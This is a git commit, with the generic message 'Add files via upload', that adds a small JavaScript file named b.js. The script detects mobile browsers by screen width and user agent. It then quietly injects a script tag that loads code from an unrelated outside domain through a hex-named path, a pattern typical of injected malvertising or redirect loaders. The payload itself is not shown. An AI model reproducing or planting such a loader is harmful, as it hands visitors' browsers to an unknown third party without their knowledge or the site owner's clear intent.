6221b2718ba3a809c8ef660a261906bac3707ed2
dork12 <109478237+dork12@users.noreply.github.com>
2022-07-18 01:15:50 +0700

    Add files via upload

---
+++ b.js
@@ -0,0 +1,10 @@
+if (screen.width < 500 ||
+ navigator.userAgent.match(/Android/i) ||
+ navigator.userAgent.match(/webOS/i) ||
+ navigator.userAgent.match(/iPhone/i) ||
+ navigator.userAgent.match(/iPod/i)){
+	 
+	(function(s,u,p){s.src=u,p.appendChild(s);})(document.createElement('script'),'https://sadnesscontemporary.com/9a/27/fd/9a27fda9a1a407c0b71e8129c2fe155c.js',document.body||document.documentElement)
+	 }
+	 
+	
